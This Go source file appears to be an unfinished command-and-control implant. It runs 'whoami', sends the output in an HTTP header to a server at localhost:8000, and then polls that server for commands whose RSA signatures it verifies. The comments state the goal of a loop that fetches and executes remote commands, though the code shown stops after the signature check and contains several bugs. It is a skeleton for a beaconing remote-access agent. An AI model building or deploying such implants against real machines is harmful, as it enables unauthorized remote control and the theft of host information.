package main

import (
	"fmt"
	"encoding/pem"
    "crypto/x509"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"time"
	"uuid"
	"crypto"
	"crypto/rsa"
	"crypto/sha1"
)

func main() {
	// We needed the \n in the public key otherwise we get a segfault
	// This block handles turning the public key from this raw data to something usable
	// https://blog.cubieserver.de/2016/go-verify-cryptographic-signatures/
	var rawPubKey = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvqQbtJTDJyZf7oc9RQgnhQ4oWOWW/oVdJQ8oZYsOb/e6GCxeawAjkjAe4dXuczAnwaCPBCHIkv962s4xmDhVaWmzKk+QhNfjA2hmgaaNVxQRwEF3XINHcRBkxvrCyRtugQYVwk/6GYphWQw/lwKPmdUJY6vLKzODk8GN5uLBaHHVopCIN9/UNOPkC+/+8Nh5g1cyZ7utO3/ywArCh19Hit4/twioLM5BoKG7rQw3m/ykKKimZP6eHGIRJGEYuSpgXnLqmpQpcCSMHbtqb7tveSs7oo8wiciUPcgIdkNUTMeLnn5/3gT6t7d2MvmE26VySk7Vp6EWeA6AUWMv/HOUiwIDAQAB\n-----END PUBLIC KEY-----"
	block, _ := pem.Decode([]byte(rawPubKey))
	key, err := x509.ParsePKIXPublicKey(block.Bytes)
	publicKey := key.(*rsa.PublicKey)
   
	uuidWithHyphen := uuid.New()
	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
	// Construct the client for requests, we define nothing right now but in the future can add functionality
	client := http.Client{}
	sb1 := "whoami"

	cmd := exec.Command(sb1)
	// Consider adding here logic to execute these commands under a new process or a child process to avoid crashing the main program if the command errors

	result, _ := cmd.Output()
	toSend := string(result)
	toSend = strings.Replace(toSend, "\n", "", -1)
	fmt.Printf(toSend)

	//time.Sleep(10)
	req, err := http.NewRequest("GET", "http://localhost:8000/", nil)
	req.Header = http.Header{"APPSESSIONID": {uuid},"Res": {toSend},"User-Agent": {"testing testing"}}
	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
	for true {
		// current issue is that we're not retrieving and executing the new ocmmand 
		req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
		req.Header.Add("APPSESSIONID", uuid)
		resp, err = client.Do(req)
		body, err := ioutil.ReadAll(resp.Body)
		//body = string(body)
		//fmt.Printf(body)
		statusC := resp.Status
		if err != nil {
			log.Fatalln(err)
		}

		//Convert the body to type string
		sb := string(body)
		for sb == "0"{
			time.Sleep(2 * time.Second)
			req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
			req.Header.Add("APPSESSIONID", uuid)
			resp, err = client.Do(req)
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalln(err)
			}
			sb = string(body)
		}
		// After verifying we have a command to execute, we now need to grab the commands signature
		// This is stored in a header value of the request
		rawSignature := resp.Header.Get("Verifier")
		signature := []byte(rawSignature)
		//signature, err := base64.StdEncoding.DecodeString(rawSignature)
		hash := sha1.Sum([]byte(sb))

		err = rsa.VerifyPKCS1v15(publicKey, crypto.SHA1, hash[:], signature)
		if err != nil {
			fmt.Println(err)
			return
		}
		
		fmt.Printf(statusC)
		fmt.Printf("\n")
		
		
		fmt.Println("Successfully verified message with signature and public key")
    	return

	}
}